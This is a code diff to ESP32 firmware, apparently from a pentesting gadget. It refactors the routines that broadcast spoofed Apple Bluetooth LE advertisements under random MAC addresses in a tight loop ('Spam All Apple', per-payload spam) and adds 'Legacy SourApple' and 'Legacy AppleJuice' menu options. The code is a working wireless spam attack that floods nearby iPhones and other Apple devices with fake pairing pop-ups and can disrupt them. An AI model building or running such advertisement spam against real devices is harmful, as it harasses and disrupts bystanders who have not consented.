@@ -179,59 +179,54 @@ void startAppleSpamAll() {
 
     drawMainBorderWithTitle("Spam All Apple");
     padprintln("");
-    padprintln("Cycling 22 Apple payloads");
-    padprintln("Press ESC to stop");
+    padprintln("Cycling Apple payloads");
+    padprintln("Press any key to stop");
+
+    // Init ONCE (see startAppleSpam): a per-advertisement init/deinit starved the
+    // key check (laggy/missed BACK) and churned the stack. Cycle the PAYLOAD each
+    // loop instead; poll input every ~85ms; deinit once on exit.
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
+    BLEDevice::init("");
+    pAppleAdvertising = BLEDevice::getAdvertising();
 
     int apple_index = 0;
-
+    uint32_t lastInfo = 0;
     while (apple_spam_running) {
-        if (check(EscPress)) {
-            stopAppleSpam();
-            returnToMenu = true;
-            break;
-        }
-
-        displayTextLine(String(apple_payloads[apple_index].name) + " " + String(millis() / 1000) + "s");
-
-        uint8_t macAddr[6];
-        generateRandomMac(macAddr);
-        esp_base_mac_addr_set(macAddr);
-
-        BLEDevice::init("");
-        BLEAdvertising *pAdv = BLEDevice::getAdvertising();
+        if (check(EscPress) || check(AnyKeyPress)) break; // any key stops
 
         BLEAdvertisementData advertisementData = BLEAdvertisementData();
         advertisementData.setFlags(0x06);
-
         uint8_t fullPayload[31];
         fullPayload[0] = apple_payloads[apple_index].length + 1;
         fullPayload[1] = 0xFF;
         memcpy(&fullPayload[2], apple_payloads[apple_index].data, apple_payloads[apple_index].length);
-
 #ifdef NIMBLE_V2_PLUS
         advertisementData.addData(fullPayload, apple_payloads[apple_index].length + 2);
 #else
         std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[apple_index].length + 2);
         advertisementData.addData(payloadVector);
 #endif
-
-        pAdv->setAdvertisementData(advertisementData);
-        pAdv->setScanResponseData(BLEAdvertisementData());
-        pAdv->setMinInterval(32);
-        pAdv->setMaxInterval(48);
-        pAdv->start();
-        vTaskDelay(100 / portTICK_PERIOD_MS);
-        pAdv->stop();
+        pAppleAdvertising->setAdvertisementData(advertisementData);
+        pAppleAdvertising->setScanResponseData(BLEAdvertisementData());
+        pAppleAdvertising->setMinInterval(32);
+        pAppleAdvertising->setMaxInterval(48);
+        pAppleAdvertising->start();
+        vTaskDelay(80 / portTICK_PERIOD_MS);
+        pAppleAdvertising->stop();
         vTaskDelay(5 / portTICK_PERIOD_MS);
 
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-        esp_bt_controller_deinit();
-#else
-        BLEDevice::deinit();
-#endif
-
+        if (millis() - lastInfo > 400) {
+            displayTextLine(
+                String(apple_payloads[apple_index].name) + " " + String(millis() / 1000) + "s"
+            );
+            lastInfo = millis();
+        }
         apple_index = (apple_index + 1) % apple_payload_count;
     }
+    stopAppleSpam();
+    returnToMenu = true;
 }
 
 void startAppleSpam(int payloadIndex) {
@@ -243,63 +238,62 @@ void startAppleSpam(int payloadIndex) {
 
     drawMainBorderWithTitle(apple_payloads[payloadIndex].name);
     padprintln("");
-    padprintln("Press ESC to stop");
+    padprintln("Press any key to stop");
 
-    while (apple_spam_running) {
-        if (check(EscPress)) {
-            stopAppleSpam();
-            returnToMenu = true;
-            break;
-        }
+    // Init the BLE stack ONCE (one random MAC for the session). The old code
+    // re-init+deinit'd the whole stack on EVERY advertisement, which blocked for
+    // hundreds of ms each loop: the key check was starved so BACK was missed/laggy
+    // (and the churn destabilised the stack). Now we init once, advertise in a
+    // tight loop that polls input each ~85ms, and deinit once on exit.
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
+    BLEDevice::init("");
+    pAppleAdvertising = BLEDevice::getAdvertising();
 
-        uint8_t macAddr[6];
-        generateRandomMac(macAddr);
-        esp_base_mac_addr_set(macAddr);
-
-        BLEDevice::init("");
-        pAppleAdvertising = BLEDevice::getAdvertising();
-
-        BLEAdvertisementData advertisementData = BLEAdvertisementData();
-        advertisementData.setFlags(0x06);
-
-        uint8_t fullPayload[31];
-        fullPayload[0] = apple_payloads[payloadIndex].length + 1;
-        fullPayload[1] = 0xFF;
-        memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);
-
+    BLEAdvertisementData advertisementData = BLEAdvertisementData();
+    advertisementData.setFlags(0x06);
+    uint8_t fullPayload[31];
+    fullPayload[0] = apple_payloads[payloadIndex].length + 1;
+    fullPayload[1] = 0xFF;
+    memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);
 #ifdef NIMBLE_V2_PLUS
-        advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
+    advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
 #else
-        std::vector<uint8_t> payloadVector(
-            fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2
-        );
-        advertisementData.addData(payloadVector);
+    std::vector<uint8_t> payloadVector(
+        fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2
+    );
+    advertisementData.addData(payloadVector);
 #endif
+    pAppleAdvertising->setAdvertisementData(advertisementData);
+    pAppleAdvertising->setScanResponseData(BLEAdvertisementData());
+    pAppleAdvertising->setMinInterval(32);
+    pAppleAdvertising->setMaxInterval(48);
 
-        pAppleAdvertising->setAdvertisementData(advertisementData);
-        BLEAdvertisementData scanResponseData = BLEAdvertisementData();
-        pAppleAdvertising->setScanResponseData(scanResponseData);
-        pAppleAdvertising->setMinInterval(32);
-        pAppleAdvertising->setMaxInterval(48);
+    uint32_t lastInfo = 0;
+    while (apple_spam_running) {
+        if (check(EscPress) || check(AnyKeyPress)) break; // any key stops, polled each loop
         pAppleAdvertising->start();
-        vTaskDelay(100 / portTICK_PERIOD_MS);
+        vTaskDelay(80 / portTICK_PERIOD_MS);
         pAppleAdvertising->stop();
         vTaskDelay(5 / portTICK_PERIOD_MS);
-
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-        esp_bt_controller_deinit();
-#else
-        BLEDevice::deinit();
-#endif
-
-        displayTextLine(String(apple_payloads[payloadIndex].name) + " " + String(millis() / 1000) + "s");
+        if (millis() - lastInfo > 500) {
+            displayTextLine(
+                String(apple_payloads[payloadIndex].name) + " " + String(millis() / 1000) + "s"
+            );
+            lastInfo = millis();
+        }
     }
+    stopAppleSpam(); // stops advertising + deinits the stack once
+    returnToMenu = true;
 }
 
 void appleSubMenu() {
     std::vector<Option> appleOptions;
 
     appleOptions.push_back({"Spam All Apple", []() { startAppleSpamAll(); }});
+    appleOptions.push_back({"Legacy SourApple", []() { aj_adv(7); }});
+    appleOptions.push_back({"Legacy AppleJuice", []() { aj_adv(8); }});
 
     for (int i = 0; i < apple_payload_count; i++) {
         appleOptions.push_back({apple_payloads[i].name, [i]() { startAppleSpam(i); }});
